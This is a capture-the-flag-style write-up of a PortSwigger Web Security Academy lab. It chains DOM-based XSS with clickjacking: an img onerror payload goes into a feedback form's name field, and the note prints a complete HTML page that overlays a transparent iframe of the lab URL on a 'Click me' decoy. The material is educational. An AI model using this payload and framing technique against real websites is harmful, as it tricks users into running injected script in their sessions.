# [ClickJacking] Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS (1)

---

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled.png)

first let's find a dom XSS exploit 

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled%201.png)

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled%202.png)

the innerHTML used in the submit feedback script isn’t properly checking 

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled%203.png)

now lets try inject script tags 

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled%204.png)

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled%205.png)

but our script tags arent executing since we’re still in a string context

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled%206.png)

URL: [https://0a4f004e044e99db82e729de00be004e.web-security-academy.net/feedback?name=<img src=x onerror="print()">&email=test@test.com&subject=test&message=test](https://0a4f004e044e99db82e729de00be004e.web-security-academy.net/feedback?name=%3Cimg%20src=x%20onerror=%22print()%22%3E&email=test@test.com&subject=test&message=test)

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled%207.png)

how to fool user into submitting the payload in name of feedback form: 

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled%208.png)

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled%209.png)

after URL encoding the img tag this is my new URL: 

[https://0a4f004e044e99db82e729de00be004e.web-security-academy.net/feedback?name=<img src%3Dx onerror%3D"print()">&email=test@test.com&subject=test&message=test](https://0a4f004e044e99db82e729de00be004e.web-security-academy.net/feedback?name=%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%22%70%72%69%6e%74%28%29%22%3e&email=test@test.com&subject=test&message=test) 

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled%2010.png)

my final CODE For payload was: 

```jsx
<head>
	<style>
		#target_website {
			position:relative;
			width:508px;
			height:1000px;
			opacity:0.10001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			left:100px;
			top:800px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	Click me
	</div>
	<iframe id="target_website" src=" https://0a4f004e044e99db82e729de00be004e.web-security-academy.net/feedback?name=%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%22%70%72%69%6e%74%28%29%22%3e&email=test@test.com&subject=test&message=test ">
	</iframe>
</body>
```

![Untitled](%5BClickJacking%5D%20Lab%20Exploiting%20clickjacking%20vulnera%202494ad908a1f4100b65eb1c35d98ef79/Untitled%2011.png)